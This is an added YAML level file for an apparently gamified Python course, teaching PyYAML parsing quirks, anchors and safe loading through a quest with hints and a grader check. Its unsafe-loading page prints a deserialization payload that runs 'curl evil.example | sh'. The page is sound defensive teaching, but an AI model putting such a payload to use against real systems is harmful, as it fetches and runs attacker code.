@@ -1,0 +1,176 @@
+id: yaml_scriptorium
+name: The YAML Scriptorium
+order: 10
+zone: YAML
+description: |
+  Monks hunch over desks, copying pipelines by candlelight. Every indentation
+  is measured with a tiny silver ruler. On the wall hangs a framed map of
+  Scandinavia where **Norway** has been crossed out and replaced with the word
+  `False`. Nobody here will talk about it.
+exits:
+  west: settings_observatory
+  north: cicd_foundry
+npc:
+  name: Scribe Yamlina
+  aliases: [scribe, yamlina]
+  greeting: |
+    "You've written YAML for years: Azure Pipelines, GitHub Actions, maybe
+    Kubernetes. You know the *syntax*. Here you'll learn how a **parser** sees
+    it, and why the Python ecosystem treats YAML from strangers like a loaded
+    crossbow.
+
+    Write the guild's starting quests as YAML, and a loader that turns them into
+    your pydantic `Quest` models. Safely."
+  topics:
+    norway: |
+      "PyYAML implements YAML **1.1**, where `yes`, `no`, `on`, `off`, `y` and `n`
+      are booleans. So `country: NO` loads as `False`, and in a GitHub Actions
+      file the top-level key `on:` loads as the boolean `True`. (GitHub's own
+      parser is fine; it's *your Python script* reading the workflow that gets
+      surprised.) Quote anything that could be misread: `country: "NO"`."
+    ruamel: |
+      "`ruamel.yaml` implements YAML 1.2 and can **round-trip**: load, edit and
+      save while preserving comments and ordering. Use it when your tool edits
+      human-maintained YAML. PyYAML drops comments."
+    json: |
+      "Every JSON document is (almost) valid YAML 1.2. For machine-to-machine
+      data, prefer JSON: one way to write each thing, and no Norway."
+    multiline: |
+      "`|` keeps newlines (literal block, perfect for scripts in pipelines).
+      `>` folds newlines into spaces (folded block, for long prose).
+      `|-` / `>-` strip the trailing newline. `|+` keeps all trailing newlines."
+pages:
+  - title: How a parser sees YAML
+    body: |
+      ```yaml
+      # mapping (dict) → sequence (list) → scalars
+      guild: Mages of the Azure Tower
+      founded: 2019-03-01          # becomes a datetime.date
+      members: 42                  # int
+      motto: "Cast first, ask questions later"
+      tags: [arcane, cloud]        # flow sequence
+      leaders:                     # block sequence of mappings
+        - name: Ada
+          role: archmage
+        - name: Grace
+          role: compiler-whisperer
+      ---                          # a second document in the same file
+      another: doc
+      ```
+
+      ```python
+      import yaml
+      data = yaml.safe_load(text)               # first document
+      docs = list(yaml.safe_load_all(text))     # all documents
+      text = yaml.safe_dump(data, sort_keys=False)
+      ```
+
+      **Anchors and aliases** let you reuse a block, as with Azure Pipelines
+      templates but inline:
+
+      ```yaml
+      defaults: &quest_defaults    # define an anchor
+        rank: C
+        guilds: [mages]
+      quests:
+        - <<: *quest_defaults      # merge it in
+          title: Clear the cellar
+          reward: 5
+      ```
+  - title: The footguns
+    body: |
+      | You wrote | PyYAML (YAML 1.1) gives you |
+      |---|---|
+      | `country: NO` | `False` |
+      | `on: push` (top level) | `{True: "push"}` |
+      | `version: 1.10` | `1.1` (a float!) |
+      | `mode: 0755` | `493` (octal), while `0800` stays the string `"0800"` |
+      | `time: 12:30` | `750` (base-60, seriously) |
+      | `sha: 1e10` | the string `"1e10"`, but `1.0e+10` is a float |
+      | `name: null`, `name: ~`, `name:` | `None` |
+
+      Rules that keep you safe:
+
+      1. **Quote strings** that look like anything else: versions, codes, times.
+      2. Spaces, never tabs (tabs are illegal for indentation).
+      3. **Validate after loading**: YAML gives you dicts of guesses, and
+         pydantic turns them into facts.
+  - title: Never load untrusted YAML unsafely
+    body: |
+      PyYAML's full loader can construct **arbitrary Python objects**:
+
+      ```yaml
+      quests: !!python/object/apply:os.system ["curl evil.example | sh"]
+      ```
+
+      `yaml.load(text, Loader=yaml.UnsafeLoader)` (or very old code calling
+      `yaml.load(text)` without a loader) will **run that command**. It's the
+      same class of bug as .NET's `BinaryFormatter`, and the same fix applies:
+      a loader that only builds plain data.
+
+      ```python
+      data = yaml.safe_load(text)    # dicts, lists, str, int, float, bool, None, dates
+      ```
+
+      Then validate. A `TypeAdapter` handles a list in one call:
+
+      ```python
+      from pathlib import Path
+      from pydantic import TypeAdapter
+      from questboard.models import Quest
+
+      _QUESTS = TypeAdapter(list[Quest])
+
+      def load_quests(path: str | Path) -> list[Quest]:
+          data = yaml.safe_load(Path(path).read_text(encoding="utf-8")) or {}
+          return _QUESTS.validate_python(data.get("quests", []))
+      ```
+quest:
+  title: Illuminate the Manuscript
+  brief: |
+    1. Create **`data/quests.yaml`** with a top-level `quests:` list of at least
+       **3** quests (fields matching your `Quest` model). Use an **anchor**
+       (`&name`) and an **alias** (`*name`, e.g. via `<<:` merge) for shared
+       defaults.
+    2. Create **`questboard/seed.py`** with
+       `load_quests(path: str | Path) -> list[Quest]` that uses `yaml.safe_load`
+       and validates with pydantic.
+
+    The runes will also feed your loader a **malicious** YAML file. Nothing
+    must execute.
+  check: yaml_scriptorium
+  scaffold:
+    data/quests.yaml: quests.yaml
+    questboard/seed.py: seed.py
+  hints:
+    - "Anchor on a mapping: `defaults: &defaults` then indented keys. Use it with `- <<: *defaults` followed by the quest's own keys at the same indentation."
+    - "`yaml.safe_load` returns `None` for an empty file, so `data = yaml.safe_load(text) or {}`."
+    - "`TypeAdapter(list[Quest]).validate_python(data[\"quests\"])` validates the whole list. Or use a comprehension: `[Quest.model_validate(q) for q in data[\"quests\"]]`."
+  solution:
+    files:
+      data/quests.yaml: quests.yaml
+      questboard/seed.py: seed.py
+  commit_message: "Seed quests from YAML"
+  reward:
+    xp: 200
+    item:
+      name: Illuminated Quill
+      aliases: [quill]
+      text: |
+        ```python
+        yaml.safe_load(text)            # never yaml.load / UnsafeLoader on untrusted input
+        yaml.safe_load_all(text)        # multi-document
+        yaml.safe_dump(obj, sort_keys=False)
+        TypeAdapter(list[Model]).validate_python(data)
+        ```
+
+        ```yaml
+        base: &base {rank: C}          # anchor
+        item: {<<: *base, title: x}    # alias + merge
+        script: |                      # literal block (keeps newlines)
+          echo hi
+        text: >                        # folded block
+          one long line
+        country: "NO"                  # QUOTE ambiguous scalars
+        version: "1.10"
+        ```
